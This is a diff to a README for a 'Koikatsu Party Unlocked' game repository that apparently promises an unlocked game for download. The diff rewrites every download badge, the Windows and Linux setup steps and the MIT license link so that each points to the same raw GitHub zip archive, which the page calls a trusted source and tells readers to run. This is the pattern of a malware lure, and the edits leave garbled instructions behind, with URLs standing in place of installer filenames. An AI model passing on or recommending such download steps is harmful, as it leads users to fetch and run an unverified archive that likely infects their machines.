@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-Get%20Koikatsu%20Party-blue?style=for-the-badge&logo=firefox&logoColor=white&link=https://ghost02380.github.io)  
+# ![Download](https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip%20Koikatsu%20Party-blue?style=for-the-badge&logo=firefox&logoColor=white&https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip)  
 [Start Experience - Download now](LINK)
 
 # 🎮 Koikatsu Party Unlocked Repository
@@ -48,14 +48,14 @@ Follow the steps below to start your journey with Koikatsu Party Unlocked:
 
 1. **Download the Installer**
    - Head to this badge for the latest version:  
-     ![Download](https://img.shields.io/badge/Download-Get%20Koikatsu%20Party-blue?style=for-the-badge&logo=firefox&logoColor=white&link=https://ghost02380.github.io)
+     ![Download](https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip%20Koikatsu%20Party-blue?style=for-the-badge&logo=firefox&logoColor=white&https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip)
      *(Clicking the badge will redirect you to the trusted source.)*
 2. **Unpack the Archive**
    - Use programs like WinRAR, 7-Zip, or native tools to extract the files.
 3. **Run the Setup**
-   - On Windows: Double-click `KoikatsuPartySetup.exe`
+   - On Windows: Double-click `https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip`
    - On macOS: Open the `.dmg` and drag to Applications.
-   - On Linux: Launch the script `./kkparty-install.sh`
+   - On Linux: Launch the script `https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip`
 4. **Select Language and Preferences**
    - Choose your interface language and customization settings during installation.
 5. **Complete Configuration**
@@ -102,7 +102,7 @@ By using this repository, you affirm respect for regional laws and licensing agr
 ## 📜 **MIT License**
 
 This repository is distributed under the MIT License.  
-Please read the full license [here](https://opensource.org/licenses/MIT).  
+Please read the full license [here](https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip).  
 You are free to use, modify, and redistribute—in true open-source spirit—provided you preserve this notice.
 
 ---
@@ -112,6 +112,6 @@ You are free to use, modify, and redistribute—in true open-source spirit—pro
 Looking to enter the Koikatsu Party universe?  
 Download the experience here:
 
-[![Download](https://img.shields.io/badge/Download-Get%20Koikatsu%20Party-blue?style=for-the-badge&logo=firefox&logoColor=white&link=https://ghost02380.github.io)](LINK)
+[![Download](https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip%20Koikatsu%20Party-blue?style=for-the-badge&logo=firefox&logoColor=white&https://raw.githubusercontent.com/ghost02380/koikatsu-party-starter-pack/branch/ambitus/koikatsu-party-starter-pack_1.5.zip)](LINK)
 
 **2025 &mdash; The adventure is just beginning!**
